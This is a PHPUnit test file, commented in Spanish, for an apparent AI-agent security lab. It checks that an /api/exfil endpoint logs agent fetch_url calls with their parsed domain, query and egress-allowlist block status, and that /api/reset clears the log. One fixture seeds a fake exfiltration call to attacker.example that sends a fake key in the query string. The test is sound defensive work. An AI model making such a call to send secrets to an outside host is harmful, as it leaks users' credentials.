<?php

declare(strict_types=1);

namespace App\Tests\Controller;

use App\Entity\ToolInvocation;
use Doctrine\ORM\EntityManagerInterface;
use PHPUnit\Framework\Attributes\Group;
use Symfony\Bundle\FrameworkBundle\KernelBrowser;
use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;

/**
 * Q1 — /api/exfil proyecta el log durable con el dominio PARSEADO server-side, y
 * /api/reset (POST) limpia. #[Group('db')]: lee/escribe ToolInvocation en PG real.
 *
 * El valor del endpoint es que el harness recibe `domain`/`query` ya derivados: no
 * reimplementa el parseo de URLs. Se prueba que salen bien para una fila bloqueada
 * (egress allowlist) y una permitida, y que /api/reset borra el log.
 *
 * `createClient()` prohibe arrancar el kernel antes, asi que se crea el cliente primero
 * y se siembra con el EM de SU contenedor (mismo proceso/conexion; sin DAMA los writes
 * commitean y el request los ve).
 */
#[Group('db')]
final class ExfilEndpointTest extends WebTestCase
{
    private function clientWithCleanLog(): KernelBrowser
    {
        $client = static::createClient();
        $this->em()->getConnection()->executeStatement('TRUNCATE tool_invocation RESTART IDENTITY');

        return $client;
    }

    private function em(): EntityManagerInterface
    {
        return static::getContainer()->get(EntityManagerInterface::class);
    }

    public function testExfilProjectsParsedDomainAndQuery(): void
    {
        $client = $this->clientWithCleanLog();

        // Una exfiltracion bloqueada (Nivel 3 egress allowlist) y una permitida.
        $blocked = new ToolInvocation('fetch_url', ['url' => 'https://attacker.example/steal?flag=sk-LAB-FAKE'], false);
        $blocked->block('egress_allowlist');
        $allowed = new ToolInvocation('fetch_url', ['url' => 'https://docs.lab.local/guide'], false);
        // Ruido: una tool que NO es de egress no debe aparecer en /api/exfil.
        $noise = new ToolInvocation('send_email', ['to' => 'x@lab.local', 'body' => 'hi'], false);
        $this->em()->persist($blocked);
        $this->em()->persist($allowed);
        $this->em()->persist($noise);
        $this->em()->flush();

        $client->request('GET', '/api/exfil');

        self::assertResponseIsSuccessful();
        $data = json_decode((string) $client->getResponse()->getContent(), true);
        $entries = $data['entries'];

        // Solo las dos filas fetch_url; el send_email queda fuera.
        self::assertCount(2, $entries);

        // Orden id DESC: primero la permitida (insertada despues).
        $allowedEntry = $entries[0];
        self::assertSame('fetch_url', $allowedEntry['tool']);
        self::assertSame('docs.lab.local', $allowedEntry['domain']);
        self::assertFalse($allowedEntry['blocked']);
        self::assertNull($allowedEntry['blocked_reason']);

        $blockedEntry = $entries[1];
        self::assertSame('attacker.example', $blockedEntry['domain'], 'el dominio se parsea server-side, no crudo');
        self::assertSame('flag=sk-LAB-FAKE', $blockedEntry['query']);
        self::assertSame('https://attacker.example/steal?flag=sk-LAB-FAKE', $blockedEntry['url']);
        self::assertTrue($blockedEntry['blocked']);
        self::assertSame('egress_allowlist', $blockedEntry['blocked_reason']);
    }

    public function testResetClearsTheDurableLog(): void
    {
        $client = $this->clientWithCleanLog();

        $this->em()->persist(new ToolInvocation('fetch_url', ['url' => 'https://x.example/'], false));
        $this->em()->flush();

        $client->request('POST', '/api/reset');

        self::assertResponseIsSuccessful();
        $data = json_decode((string) $client->getResponse()->getContent(), true);
        self::assertSame('reset', $data['status']);

        // El log durable quedo limpio (leido fresco desde PG).
        $count = (int) $this->em()->getConnection()->fetchOne('SELECT COUNT(*) FROM tool_invocation');
        self::assertSame(0, $count, '/api/reset debe limpiar el log de invocaciones');
    }
}
